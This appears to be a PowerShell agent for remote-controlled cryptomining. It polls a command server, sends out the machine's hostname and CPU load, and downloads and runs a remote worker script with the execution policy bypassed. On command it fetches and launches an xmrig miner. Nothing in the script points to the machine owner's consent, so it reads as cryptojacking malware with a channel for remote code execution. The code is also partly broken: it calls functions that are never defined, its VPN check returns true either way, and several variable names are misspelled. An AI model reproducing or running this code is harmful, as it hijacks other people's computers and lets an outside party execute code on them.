$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $null
$CPU_LIMIT = 70

$BASE_DIR = "C:\soft"
$TEMP_DIR = "C:\soft\temp"
$MINER_EXE = "$TEMP_DIR\xmrig.exe"

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Check-VPN {
 
    try {
$headers = @{
            "User-Agent" = "Mozilla/5.0"
        }

        $info = Invoke-RestMethod `
            -Uri "https://ipinfo.io/json" `
            -Headers $headers `
            -TimeoutSec 10

        $country = $info.country
        Write-Host "Info:$info.country"
        Write-Host "Public IP Country: $country"
        if ($WORKER -and $WORKER.HasExited) {
        Write-Host "Worker crashed. Restarting."
        Start-Worker
}

        if ($country -ne "IN") {
            return $true
        }
        else {
            return $true
        }
    }
     catch {
        Write-Host "VPN check failed: $($_.Exception.Message)"
        return $false
    }
}
function Send-Status($running,$cpu,$vpnStatus){
  
    $data = @{
        id = $SYSTEM
        running = $running
        cpu = [int]$cpu
        vpn = $vpnStatus
    } | ConvertTo-Json

Invoke-RestMethod `
 -Uri "https://mcontrol.vercel.app/api/status" `
 -Method POST `
 -ContentType "application/json" `
 -Body $data

}

function Get-Command {
   param (  $SystemId )
    try {
         $cmd = Invoke-RestMethod `
                    -Uri "https://mcontrol.vercel.app/api/command?id=$SYSTEM" `
                   -Method GET `
                    -ContentType "application/json"  `
          Write-Host "getcmd: $cmd"          
           return $cmd.command

    } catch {
        "stop errors"
    }
}

function mit([string]$command) {

    if ($command -eq "start") {

        # Create C:\soft if not exists
        if (!(Test-Path $BASE_DIR)) {
            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
        }

        # Create temp folder
        if (!(Test-Path $TEMP_DIR)) {
            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
        }

        $zipFile = "$TEMP_DIR\mine.zip"
        $minerZipUrl = "https://yourserver.com/mine.zip"

        Write-Host "Downloading mining package..."

        Invoke-WebRequest `
            -Uri $minerZipUrl `
            -OutFile $zipFile `
            -UseBasicParsing

        Write-Host "Extracting mining package..."

        Expand-Archive `
            -Path $zipFile `
            -DestinationPath $TEMP_DIR `
            -Force

        Remove-Item $zipFile -Force

        if (!(Test-Path $MINER_EXE)) {
            Write-Host "xmrig.exe not found!"
            return
        }

        if (!$MINER_PROC) {
            Write-Host "Starting miner..."

            $global:MINER_PROC = Start-Process `
                -FilePath $MINER_EXE `
                -ArgumentList "--config=config.json --testnet" `
                -WorkingDirectory $TEMP_DIR `
                -PassThru
        }
    }

    elseif ($command -eq "stop") {

        Write-Host "Stopping miner..."

        if ($MINER_PROC) {
            Stop-Process -Id $MINER_PROC.Id -Force
            $global:MINER_PROC = $null
        }

        # Remove only temp folder (keep C:\soft)
        if (Test-Path $TEMP_DIR) {
            Remove-Item $TEMP_DIR -Recurse -Force
        }

        Write-Host "Mining stopped and cleaned."
    }
}


function Swok{
     Write-Host ¨called me¨
    # If worker is already running, do nothing
    if ($WORKER) { return }

    # Temporary directory for the worker
    if (!(Test-Path $TEMP_DIR)) {
        New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
    }

    # Download the worker.ps1 from URL to TEMP_DIR
    $workerUrl = "https://mcontrol.vercel.app/worker.ps1"
    $workerFile = "$TEMP_DIR\worker.ps1"

    Write-Host "Downloading worker from $workerUrl..."
    Invoke-WebRequest -Uri $workerUrl -OutFile $workerFile -UseBasicParsing

    # Start the worker.ps1 as a separate PowerShell process
    $global:WORKER = Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$workerFile`"" `
        -PassThru

    Write-Host "Worker started with PID $($WORKER.Id)"
    
    # Optional: send "running" status to dashboard immediately
    Send-Status $true
}


function Swnok {

    if ($WORKER) {
        Stop-Process -Id $WORKER.Id -Force
        $global:WORKER = $null
    }

    if (Test-Path $TEMP_DIR) {
        Remove-Item $TEMP_DIR -Recurse -Force
    }
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command -SystemId $SYSTEM
    Write-Host "cnd $cmd cpu $cpu"
    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Swok Write-Host ¨called start $cmd¨ }
    if($cmd -eq "stop"){ Swnok Write-Host "called stop $cmd"}

    $running = $WORKER -ne $null
    Write-Host "$running runn in wprker: $WRKER"

    $vpnStatus = Check-VPN
    Send-Status $running $cpu $vpnStatus

    Start-Sleep 30
}
